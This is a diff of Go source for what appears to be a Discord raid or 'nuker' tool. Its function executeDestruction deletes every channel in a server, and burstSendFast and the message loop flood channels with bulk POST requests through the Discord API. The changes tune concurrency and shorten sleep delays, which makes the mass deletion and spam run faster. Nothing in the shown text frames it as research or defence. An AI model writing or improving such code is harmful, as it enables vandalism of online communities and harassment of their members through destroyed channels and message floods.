@@ -288,7 +288,6 @@ func deleteWebhooks(token string, urls []string) {
 		}(url)
 	}
 	wg.Wait()
-	time.Sleep(50 * time.Millisecond)
 }
 
 func burstSendFast(urls []string, messageContent string, sentCounter *int, totalGoal int, mu *sync.Mutex) {
@@ -309,10 +308,6 @@ func burstSendFast(urls []string, messageContent string, sentCounter *int, total
 				mu.Lock()
 				if *sentCounter >= totalGoal {
 					mu.Unlock()
-					select {
-					case stopSignal <- struct{}{}:
-					default:
-					}
 					return
 				}
 				mu.Unlock()
@@ -342,25 +337,17 @@ func burstSendFast(urls []string, messageContent string, sentCounter *int, total
 	}
 
 	for {
-		select {
-		case <-stopSignal:
-			wg.Wait()
-			return
-		default:
-			mu.Lock()
-			if *sentCounter >= totalGoal {
-				mu.Unlock()
-				select {
-				case stopSignal <- struct{}{}:
-				default:
-				}
-				wg.Wait()
-				return
-			}
+		mu.Lock()
+		if *sentCounter >= totalGoal {
 			mu.Unlock()
-			time.Sleep(10 * time.Millisecond)
+			close(stopSignal)
+			break
 		}
+		mu.Unlock()
+		time.Sleep(5 * time.Millisecond)
 	}
+
+	wg.Wait()
 }
 
 func executeDestruction(s *discordgo.Session, token, guildID, roomName string, roomsCount int, messageContent string, messagesCount int) {
@@ -383,7 +370,7 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 
 			var wgDel sync.WaitGroup
 			for _, ch := range channels {
-				if id, ok := ch["id"].(string); ok {
+				if _, ok := ch["id"].(string); ok {
 					wgDel.Add(1)
 					go func(chID string) {
 						defer wgDel.Done()
@@ -394,7 +381,7 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 						if r, e := httpClient.Do(delReq); e == nil {
 							r.Body.Close()
 						}
-					}(id)
+					}(ch["id"].(string))
 				}
 			}
 			wgDel.Wait()
@@ -469,11 +456,11 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 	var wgMsg sync.WaitGroup
 	for _, chID := range channelIDs {
 		wgMsg.Add(1)
-		go func(cID string) {
+		go func(chIDParam string) {
 			defer wgMsg.Done()
 			for m := 0; m < messagesCount; m++ {
 				msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
-				msgReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+cID+"/messages", bytes.NewBuffer(msgPayload))
+				msgReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+chIDParam+"/messages", bytes.NewBuffer(msgPayload))
 				for k, v := range headers {
 					msgReq.Header.Set(k, v)
 				}
@@ -493,7 +480,7 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 				msgResp.Body.Close()
 				time.Sleep(15 * time.Millisecond)
 			}
-		}(cID)
+		}(chID)
 	}
 	wgMsg.Wait()
 }
